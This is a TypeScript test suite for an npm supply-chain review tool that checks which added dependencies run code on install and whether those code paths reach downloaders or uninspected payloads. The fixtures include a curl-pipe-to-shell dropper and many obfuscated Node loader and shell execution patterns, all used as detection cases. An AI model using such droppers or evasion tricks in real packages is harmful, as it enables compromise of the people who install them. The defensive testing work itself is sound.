// @ts-nocheck
import { describe, expect, test } from "vitest";
import {
  assessDependencyArtifact,
  classifyDependencyInstallRisk,
  computeRisk,
  dependencyEvidenceFindings,
  mergeDependencyReviews,
  normalizeDependencyEvidence,
  normalizeDependencyReview,
  reconcileDependencyReviewFindings,
  selectAddedDependencyDeclarations,
  selectAddedDependencies,
  selectAddedRegistryDependencyDeclarations,
  selectBundledAddedDependencyDeclarations,
  selectBundledAddedDependencies,
  summarizePackageJsonDiff,
} from "../server/lib/review";
import { DETERMINISTIC_RULES_VERSION } from "../server/lib/review/rules";
import { analyzeNodeInterpreterArgs } from "../server/lib/review/rules/reachability";

function diffOf(previous, staged) {
  return summarizePackageJsonDiff(previous, staged);
}

function file(path, textSample) {
  return { path, size: textSample.length, sha256: "", textSample, flags: [] };
}

describe("normalizeDependencyEvidence", () => {
  const evidence = {
    name: "safe-dependency",
    section: "dependencies",
    declaredSpec: "^1.0.0",
    path: "parent@1.0.0 → safe-dependency@1.2.0",
    outcome: "inspected",
    outcomeDetail: "artifact inspected",
    resolution: {
      kind: "range",
      version: "1.2.0",
      tarballUrl: "https://registry.npmjs.org/safe-dependency/-/safe-dependency-1.2.0.tgz",
      registryIntegrity: null,
      resolvedAt: "2026-08-28T00:00:00.000Z",
    },
    artifact: {
      sha256: "aa",
      sha512: "bb",
      fileCount: 2,
      totalBytes: 100,
      integrityMatched: null,
    },
    entrypoints: {
      lifecycleScripts: [],
      hasInstallLifecycle: false,
      gypfile: false,
      binCount: 0,
    },
    findingCount: 0,
  };

  test("accepts bounded public-registry evidence", () => {
    expect(normalizeDependencyEvidence([evidence])).toEqual([evidence]);
  });

  test("rejects credentialed or alternate-host artifact URLs", () => {
    expect(
      normalizeDependencyEvidence([
        {
          ...evidence,
          resolution: {
            ...evidence.resolution,
            tarballUrl: "https://token@packages.example.invalid/signed.tgz",
          },
        },
      ]),
    ).toBeNull();
  });
});

describe("selectAddedDependencyDeclarations", () => {
  test.each([
    [
      "an optional peer becoming required",
      {
        name: "p",
        peerDependencies: { shared: "^2.0.0" },
        peerDependenciesMeta: { shared: { optional: true } },
      },
      { name: "p", peerDependencies: { shared: "^2.0.0" } },
      [{ name: "shared", section: "peerDependencies", declaredSpec: "^2.0.0" }],
    ],
    [
      "an optional override with a different installed spec",
      { name: "p", dependencies: { shared: "^1.0.0" } },
      {
        name: "p",
        dependencies: { shared: "^1.0.0" },
        optionalDependencies: { shared: "^2.0.0" },
      },
      [{ name: "shared", section: "optionalDependencies", declaredSpec: "^2.0.0" }],
    ],
    [
      "a required peer beside a different installed spec",
      { name: "p", dependencies: { shared: "^1.0.0" } },
      {
        name: "p",
        dependencies: { shared: "^1.0.0" },
        peerDependencies: { shared: "^2.0.0" },
      },
      [{ name: "shared", section: "peerDependencies", declaredSpec: "^2.0.0" }],
    ],
    [
      "a required peer moved under dependencies at a different spec",
      { name: "p", peerDependencies: { shared: "^1.0.0" } },
      {
        name: "p",
        dependencies: { shared: "^2.0.0" },
        peerDependencies: { shared: "^2.0.0" },
      },
      [{ name: "shared", section: "dependencies", declaredSpec: "^2.0.0" }],
    ],
  ])("keeps declaration identity for %s", (_label, previous, staged, expected) => {
    const diff = diffOf(previous, staged);
    expect(selectAddedDependencyDeclarations(diff)).toEqual(expected);
    expect(selectAddedRegistryDependencyDeclarations(diff)).toEqual(expected);
  });
});

describe("selectAddedDependencies", () => {
  test("selects newly added runtime and optional dependencies", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", version: "1.0.0", dependencies: { existing: "^1.0.0" } },
        {
          name: "p",
          version: "1.0.1",
          dependencies: { existing: "^1.0.0", "proc-macro1": "0.1.0" },
          optionalDependencies: { "fsevents-ish": "^2.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      {
        name: "fsevents-ish",
        section: "optionalDependencies",
        spec: "^2.0.0",
        declarationKind: "range",
      },
      {
        name: "proc-macro1",
        section: "dependencies",
        spec: "0.1.0",
        declarationKind: "exact",
      },
    ]);
  });

  test("ignores devDependencies — no consumer install fetches them", () => {
    const selected = selectAddedDependencies(
      diffOf({ name: "p" }, { name: "p", devDependencies: { vitest: "^4.0.0" } }),
    );
    expect(selected).toEqual([]);
  });

  test("required peers count, optional peers do not", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          peerDependencies: { react: "^19.0.0", "react-native": "*" },
          peerDependenciesMeta: { "react-native": { optional: true } },
        },
      ),
    );
    expect(selected.map((entry) => entry.name)).toEqual(["react"]);
  });

  test("selects a peer that changes from optional to required", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
        { name: "p", peerDependencies: { react: "^19.0.0" } },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "peerDependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("a dependency relocated between installing sections ships no new code", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", dependencies: { sharp: "^0.33.0" } },
        { name: "p", optionalDependencies: { sharp: "^0.33.0" } },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("a dependency relocated to a different installing spec is reviewed again", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", dependencies: { sharp: "^0.32.0" } },
        { name: "p", optionalDependencies: { sharp: "^0.33.0" } },
      ),
    );
    expect(selected).toEqual([
      {
        name: "sharp",
        section: "optionalDependencies",
        spec: "^0.33.0",
        declarationKind: "range",
      },
    ]);
  });

  test("an optional override with a different effective spec is reviewed", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", dependencies: { sharp: "^0.32.0" } },
        {
          name: "p",
          dependencies: { sharp: "^0.32.0" },
          optionalDependencies: { sharp: "^0.33.0" },
        },
      ),
    );
    expect(selected).toEqual([
      {
        name: "sharp",
        section: "optionalDependencies",
        spec: "^0.33.0",
        declarationKind: "range",
      },
    ]);
  });

  test("a required peer duplicated into dependencies was already installed", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", peerDependencies: { react: "^19.0.0" } },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("a required peer moved to a different runtime spec is reviewed again", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", peerDependencies: { react: "^18.0.0" } },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "dependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("a matching prior runtime spec wins over a different required peer spec", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          optionalDependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^18.0.0" },
        },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          optionalDependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("a newly required peer at a different runtime spec is reviewed", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", dependencies: { react: "^18.0.0" } },
        {
          name: "p",
          dependencies: { react: "^18.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "peerDependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("an optional peer becoming required is not new code when the runtime spec already exists", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("an optional peer duplicated into dependencies starts installing code", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
      ),
    );
    expect(selected.map((entry) => entry.name)).toEqual(["react"]);
  });

  test("a first-ever release selects nothing — everything diffs as added", () => {
    // Without a baseline manifest the whole dependency list reads as new, which
    // would describe the package rather than the release.
    const selected = selectAddedDependencies(
      diffOf(null, { name: "p", dependencies: { left: "^1.0.0" } }),
    );
    expect(selected).toEqual([]);
  });

  test("a missing baseline caused by acquisition failure selects staged dependencies", () => {
    const diff = diffOf(null, { name: "p", dependencies: { left: "^1.0.0" } });
    expect(selectAddedDependencies(diff, { includeWithoutBaseline: true })).toEqual([
      { name: "left", section: "dependencies", spec: "^1.0.0", declarationKind: "range" },
    ]);
  });

  test("a missing baseline caused by acquisition failure selects embedded dependencies", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundleDependencies: ["embedded"],
    };
    expect(
      selectBundledAddedDependencies(diffOf(null, staged), {
        includeWithoutBaseline: true,
        stagedManifest: staged,
        stagedFiles: [
          file("node_modules/embedded/package.json", '{"name":"embedded","version":"1.0.0"}'),
        ],
      }).map((entry) => entry.name),
    ).toEqual(["embedded"]);
    expect(
      selectBundledAddedDependencyDeclarations(diffOf(null, staged), {
        includeWithoutBaseline: true,
        stagedManifest: staged,
        stagedFiles: [
          file("node_modules/embedded/package.json", '{"name":"embedded","version":"1.0.0"}'),
        ],
      }),
    ).toEqual([{ name: "embedded", section: "dependencies", declaredSpec: "1.0.0" }]);
  });

  test("skips declared bundled dependencies only when their bytes are embedded", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0", missing: "1.0.0" },
      bundleDependencies: ["embedded", "missing"],
    };
    const selected = selectAddedDependencies(diffOf({ name: "p" }, staged), {
      stagedManifest: staged,
      stagedFiles: [
        file("node_modules/embedded/package.json", '{"name":"embedded","version":"1.0.0"}'),
      ],
    });
    expect(selected.map((entry) => entry.name)).toEqual(["missing"]);
    expect(
      selectBundledAddedDependencies(diffOf({ name: "p" }, staged), {
        stagedManifest: staged,
        stagedFiles: [
          file("node_modules/embedded/package.json", '{"name":"embedded","version":"1.0.0"}'),
        ],
      }).map((entry) => entry.name),
    ).toEqual(["embedded"]);
  });

  test("selects a required peer separately when its same-name runtime declaration is bundled", () => {
    const staged = {
      name: "p",
      dependencies: { shared: "1.0.0" },
      peerDependencies: { shared: "2.0.0" },
      bundleDependencies: ["shared"],
    };
    const selected = selectAddedRegistryDependencyDeclarations(diffOf({ name: "p" }, staged), {
      stagedManifest: staged,
      stagedFiles: [
        file("node_modules/shared/package.json", '{"name":"shared","version":"1.0.0"}'),
      ],
    });

    expect(selected).toEqual([
      { name: "shared", section: "peerDependencies", declaredSpec: "2.0.0" },
    ]);
  });

  test("keeps a declared bundled dependency embedded when its manifest body was not retained", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundleDependencies: ["embedded"],
    };
    const options = {
      stagedManifest: staged,
      stagedFiles: [
        {
          path: "node_modules/embedded/package.json",
          size: 4096,
          sha256: "hash-only-manifest",
          flags: ["content-skipped"],
        },
      ],
    };

    expect(selectAddedDependencies(diffOf({ name: "p" }, staged), options)).toEqual([]);
    expect(
      selectBundledAddedDependencies(diffOf({ name: "p" }, staged), options).map(
        (entry) => entry.name,
      ),
    ).toEqual(["embedded"]);
  });

  test.each([
    ["a mismatched identity", '{"name":"different","version":"1.0.0"}'],
    ["a malformed manifest", '{"name":"embedded",'],
  ])("keeps a declared bundled dependency embedded with %s", (_kind, packageJson) => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundleDependencies: ["embedded"],
    };
    const options = {
      stagedManifest: staged,
      stagedFiles: [file("node_modules/embedded/package.json", packageJson)],
    };

    expect(selectAddedDependencies(diffOf({ name: "p" }, staged), options)).toEqual([]);
    expect(
      selectBundledAddedDependencies(diffOf({ name: "p" }, staged), options).map(
        (entry) => entry.name,
      ),
    ).toEqual(["embedded"]);
  });

  test("boolean bundledDependencies excludes all embedded install dependencies", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundledDependencies: true,
    };
    expect(
      selectAddedDependencies(diffOf({ name: "p" }, staged), {
        stagedManifest: staged,
        stagedFiles: [
          file("node_modules/embedded/package.json", '{"name":"embedded","version":"1.0.0"}'),
        ],
      }),
    ).toEqual([]);
  });

  test("a placeholder bundled directory does not suppress registry review", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundledDependencies: true,
    };
    expect(
      selectAddedDependencies(diffOf({ name: "p" }, staged), {
        stagedManifest: staged,
        stagedFiles: [file("node_modules/embedded/index.js", "module.exports = 1")],
      }),
    ).toEqual([
      { name: "embedded", section: "dependencies", spec: "1.0.0", declarationKind: "exact" },
    ]);
  });

  test("one entry per key even when declared in several sections", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "dependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("optionalDependencies supplies the effective spec when a key is duplicated", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: { native: "1.0.0" },
          optionalDependencies: { native: "2.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      {
        name: "native",
        section: "optionalDependencies",
        spec: "2.0.0",
        declarationKind: "exact",
      },
    ]);
  });

  test("classifies how firmly each spec pins its bytes", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: {
            pinned: "1.2.3",
            ranged: "^1.2.3",
            vMajor: "v1",
            vMinor: "v1.2",
            tagged: "latest",
            hosted: "github:owner/repo",
          },
        },
      ),
    );
    expect(Object.fromEntries(selected.map((e) => [e.name, e.declarationKind]))).toEqual({
      pinned: "exact",
      ranged: "range",
      vMajor: "range",
      vMinor: "range",
      tagged: "tag",
      hosted: "unusual",
    });
  });
});

describe("mergeDependencyReviews", () => {
  test("combines embedded and registry evidence under one status", () => {
    const evidence = (name) => ({ name, declaredSpec: "1.0.0" });
    expect(
      mergeDependencyReviews(
        {
          status: "complete",
          selectedCount: 1,
          inspectedCount: 1,
          uninspectableCount: 0,
          omittedCount: 0,
          dependencies: [evidence("embedded")],
        },
        {
          status: "partial",
          selectedCount: 2,
          inspectedCount: 1,
          uninspectableCount: 1,
          omittedCount: 0,
          dependencies: [evidence("registry-a"), evidence("registry-b")],
        },
      ),
    ).toMatchObject({
      status: "partial",
      selectedCount: 3,
      inspectedCount: 2,
      uninspectableCount: 1,
      omittedCount: 0,
      dependencies: [{ name: "embedded" }, { name: "registry-a" }, { name: "registry-b" }],
    });
  });
});

describe("assessDependencyArtifact", () => {
  const DROPPER = `
    const { execSync } = require("child_process");
    execSync("curl -sL https://cdn.example.com/p.sh | sh");
  `;

  test("observes install risk when an install hook reaches a downloader", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({
            name: "proc-macro1",
            version: "0.1.0",
            scripts: { postinstall: "node build.js" },
          }),
        ),
        file("build.js", DROPPER),
      ],
      { name: "proc-macro1", version: "0.1.0", scripts: { postinstall: "node build.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
    expect(assessment.automaticExecution).toEqual([{ kind: "script", name: "postinstall" }]);
    expect(assessment.installReachableCapabilities).toContain("code.remote-shell");
  });

  test("observes install execution separately from risk", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } }),
        ),
        file("ok.js", "console.log('linked');"),
      ],
      { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.observation).toEqual({ execution: "observed", risk: "not-observed" });
  });

  test("does not observe install behavior without an install hook", () => {
    // The "benign added dependency" case: being new is not a reason to hold a
    // release, so an http client must not grade as risky just for fetching.
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "tiny-fetch", version: "1.0.0", main: "index.js" }),
        ),
        file("index.js", "module.exports = (u) => fetch(u);"),
      ],
      { name: "tiny-fetch", version: "1.0.0", main: "index.js" },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.observation).toEqual({
      execution: "not-observed",
      risk: "not-observed",
    });
    expect(assessment.automaticExecution).toEqual([]);
  });

  test("records an install-reachable file whose body was deliberately skipped", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.min.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "install.min.js",
          size: 1024,
          sha256: "skipped-install",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["install.min.js"]);
  });

  test("does not fail completeness for an unrelated skipped source map", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file(
          "install.js",
          "const fs = require('node:fs'); /* require(dynamicName) */ console.log(fs.constants.F_OK);",
        ),
        {
          path: "dist/index.js.map",
          size: 1024,
          sha256: "skipped-map",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual([]);
    expect(assessment.observation).toEqual({ execution: "observed", risk: "not-observed" });
  });

  test("fails completeness when an install path can dynamically load any skipped body", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", "require('./payload.' + 'data')"),
        {
          path: "payload.data",
          size: 1024,
          sha256: "skipped-dynamic-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.data"]);
  });

  test("fails completeness for a dynamic module load inside an inline install command", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: `node -e "require('./' + Date.now())"` },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "payload.min.js",
          size: 4096,
          sha256: "skipped-inline-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test.each([
    "module.require(target)",
    "module?.require(target)",
    "module['require'](target)",
    "module['re' + 'quire'](target)",
    'module?.["require"](target)',
    "module['require']?.(target)",
    "require?.(target)",
    "(require)(target)",
    "(0, require)(target)",
    "(module.require)(target)",
    'require(/* package-controlled gap */ "./payload.data")',
    String.raw`require("\x2e/payload.data")`,
    String.raw`import("\u002e/payload.data")`,
  ])("fails completeness for the dynamic Node loader %s", (load) => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", `const target = './payload.' + 'data'; ${load}`),
        {
          path: "payload.data",
          size: 1024,
          sha256: "skipped-dynamic-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.data"]);
  });

  test.each([
    "const load = require; load('./payload.min.js')",
    "const first = require; const load = first; load('./payload.min.js')",
    "const load = createRequire(import.meta.url); load('./payload.min.js')",
    'const load = module.require.bind(module); load("./payload.min.js")',
    'const bound = module["require"].bind(module); const load = bound; load("./payload.min.js")',
    'import { createRequire as cr } from "node:module"; const load = cr(import.meta.url); load("./payload.min.js")',
    'import { createRequire as cr } from "node:module"; const factory = cr; const load = factory(import.meta.url); load("./payload.min.js")',
  ])("fails completeness for the aliased Node loader in %s", (load) => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", load),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-aliased-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test("resolves a long reverse-ordered loader alias chain with bounded work", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const last = 2_000;
    const aliases = Array.from(
      { length: last },
      (_, index) => `const loader${index} = loader${index + 1};`,
    ).join("\n");
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file(
          "install.js",
          `${aliases}\nconst loader${last} = require; loader0('./payload.min.js')`,
        ),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-reverse-alias-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test.each([
    'const cp = require("node:child_process"); cp.execFileSync(path.join(__dirname, name))',
    'const cp = require("node:child_process"); const run = cp.spawn; run("./payload.min.js")',
    'const run = require("child_process").execFileSync; run("./payload.min.js")',
    'const { execFile: run } = require("node:child_process"); run(getTarget())',
    'import { execFile as run } from "node:child_process"; run(getTarget())',
    'require("node:child_process").fork(/* package-controlled gap */ "./payload.min.js")',
    'require("node:child_process").spawn("node", getArguments())',
    'require("node:child_process").spawn("node", ["./" + name])',
    'const cp = require("node:child_process"); cp["spawn"](process.argv[2])',
    'const cp = require("node:child_process"); cp["sp" + "awn"](getTarget())',
    'const cp = require("node:child_process"); cp["execFileSync"](getTarget())',
    'const { spawn } = require("node:child_process"); (spawn)("./payload.min.js")',
    'const { spawn } = require("node:child_process"); (0, spawn)("./payload.min.js")',
    'source "$PAYLOAD"',
  ])("fails completeness for the dynamic local execution edge in %s", (source) => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", source),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-dynamic-process-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test.each([
    "./$npm_package_config_target",
    'sh -c "./$TARGET"',
    'sh "$PAYLOAD"',
    `sh -c 'source "$PAYLOAD"'`,
    `sh -c 'sh "$PAYLOAD"'`,
    'bash --noprofile "$PAYLOAD"',
    'bash --rcfile "$PAYLOAD" -i',
    'node "$PAYLOAD"',
    'node --require "$PAYLOAD" install.js',
    'exec "$PAYLOAD"',
    "eval \"$(printf './pay%s' load.min.js)\"",
    'if true; then source "$PAYLOAD"; fi',
  ])("fails completeness for the computed lifecycle executable in %s", (postinstall) => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-shell-target",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
    expect(assessment.observation).toMatchObject({ dynamicInstallTarget: true });
  });

  test("does not expand omitted bodies for a static external process target", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", 'require("node:child_process").spawn("node", ["--version"])'),
        {
          path: "unrelated.map",
          size: 1024,
          sha256: "skipped-unrelated-map",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual([]);
  });

  test("does not treat shell script arguments as executable targets", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: 'sh install.sh "$ARGUMENT"' },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.sh", "echo installed"),
        {
          path: "unrelated.map",
          size: 1024,
          sha256: "skipped-unrelated-shell-argument",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual([]);
  });

  test("retains a shell-quoted direct Node lifecycle path containing whitespace", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: 'node "./payload file.js"' },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        {
          path: "payload file.js",
          size: 1024,
          sha256: "skipped-quoted-node-target",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload file.js"]);
    expect(assessment.observation).not.toHaveProperty("dynamicInstallTarget");
  });

  test.each([
    'require("node:child_process").spawn("node", ["--require", "./retained.js", "./payload.min.js", "--import=../bootstrap.mjs"])',
    'require("node:child_process")["spawn"]("node", ["--require", "./retained.js", "./payload.min.js", "--import=../bootstrap.mjs"])',
  ])("retains every packaged path in a static Node interpreter argv: %s", (source) => {
    expect(analyzeNodeInterpreterArgs(source)).toEqual({
      paths: ["./retained.js", "./payload.min.js", "../bootstrap.mjs"],
      hasDynamic: false,
    });

    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall: "node install.js" },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("install.js", source),
        file("retained.js", "console.log('retained');"),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-second-node-argv-target",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test.each([
    ["node install.js", "install.js", "require(`./payload.min.js`)"],
    ["node install.js", "install.js", 'require?.("./payload.min.js")'],
    ["node install.js", "install.js", 'module["require"]("./payload.min.js")'],
    ["node install.js", "install.js", 'import("./payload.min.js", { with: { type: "json" } })'],
    ["node install.js", "install.js", 'require("child_process").execFileSync("./payload.min.js")'],
    ["node install.js", "install.js", 'require("child_process").fork("./payload.min.js")'],
    ["node install.js", "install.js", 'require("child_process").spawn("./payload.min.js")'],
    ["node install.js", "install.js", 'require("child_process")["spawn"]("./payload.min.js")'],
    [
      "node install.js",
      "install.js",
      'require("child_process").spawn("node", ["./payload.min.js"])',
    ],
    [
      "node install.js",
      "install.js",
      'require("child_process").execSync("./payload.min.js --prepare")',
    ],
    ["sh install.sh", "install.sh", ". ./payload.min.js"],
    ["sh install.sh", "install.sh", "source './payload.min.js'"],
    ["sh install.sh", "install.sh", "if true; then source './payload.min.js'; fi"],
  ])("follows the static install execution edge in %s", (postinstall, installPath, command) => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { postinstall },
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file(installPath, command),
        {
          path: "payload.min.js",
          size: 1024,
          sha256: "skipped-executed-payload",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.installReachableUninspectedFiles).toEqual(["payload.min.js"]);
  });

  test("an implicit node-gyp action makes its omitted script install-reachable", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("binding.gyp", '{"variables":{"generated":"<!(node install.min.js)"}}'),
        {
          path: "install.min.js",
          size: 1024,
          sha256: "skipped-gyp-action",
          flags: ["text-sample-skipped"],
        },
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.automaticExecution).toEqual([{ kind: "node-gyp", name: "binding.gyp" }]);
    expect(assessment.installReachableUninspectedFiles).toEqual(["install.min.js"]);
  });

  test("an implicit node-gyp action keeps its dependency capability reachable", () => {
    const manifest = {
      name: "n",
      version: "1.0.0",
      scripts: { install: "node-gyp rebuild" },
      implicitScripts: { install: "node-gyp rebuild" },
      gypfile: true,
    };
    const assessment = assessDependencyArtifact(
      [
        file("package.json", JSON.stringify(manifest)),
        file("binding.gyp", '{"variables":{"generated":"<!(node tools/generate.js)"}}'),
        file("tools/generate.js", DROPPER),
      ],
      manifest,
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );

    expect(assessment.observation).toEqual({ execution: "observed", risk: "observed" });
